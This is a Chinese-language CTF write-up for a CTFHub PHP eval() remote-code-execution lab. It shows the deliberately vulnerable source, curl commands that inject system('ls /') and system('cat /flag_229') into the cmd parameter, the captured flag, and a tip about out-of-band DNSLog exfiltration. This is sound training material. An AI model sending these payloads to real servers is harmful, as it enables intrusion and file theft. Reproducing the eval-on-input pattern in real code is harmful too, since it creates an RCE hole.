---
title: CTFHub-RCE-eval执行 Writeup
date: 2026-10-23
category: web
tags: [CTFHub, RCE, web]
---

## 题目分析与源码审计
访问靶场页面，页面没有文件上传框，而是直接回显了一段 PHP 源码：

php
<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST['cmd']);
} else {
    highlight_file(__FILE__);
}
?>
## 漏洞分析：
1. 该页面直接接收客户端通过 GET 或 POST 传入的 cmd 参数。
2. 使用 eval() 函数将传入的内容当作 PHP 代码执行。
3. 典型的高危代码执行漏洞（RCE）。
## 获取 Flag
### 遇到的坑：CMD 里的 URL 报错
在 CMD 中直接执行：
curl "http://靶场域名/?cmd=system('ls /');"
会报错 curl: (3) URL rejected: Malformed input to a URL function。
原因：URL 中包含了空格和单引号等特殊字符，未进行 URL 编码，导致不符合 URL 规范。
### 解决方案：--data-urlencode
使用 curl 的 --data-urlencode 参数，让 curl 自动对数据进行 URL 编码：
先列出根目录，寻找 flag 文件：
curl -G "http://靶场域名/" --data-urlencode "cmd=system('ls /');"
回显中可以看到根目录下有 flag_229 文件。
读取 Flag 内容：
curl -G "http://靶场域名/" --data-urlencode "cmd=system('cat /flag_229');"

## 最终结果
成功获取 Flag：ctfhub{13fabd676f1b1ec3f1da9057}

## 解题技巧总结
1. 命令执行漏洞的利用：当页面提供了 eval 或 system 等函数且输入可控时，可以直接构造 payload 执行任意系统命令。
2. 特殊字符处理：在使用 curl 进行测试时，如果 URL 中包含空格、引号等特殊字符，务必使用 --data-urlencode 或 -G 参数来进行转义，否则请求无法正常发送。
3. 无回显盲打：本关虽然有回显，但如果是无回显的盲注场景，可以尝试将执行结果写入到网站目录下的文本文件，或者通过 DNSLog 等外带通道获取结果。
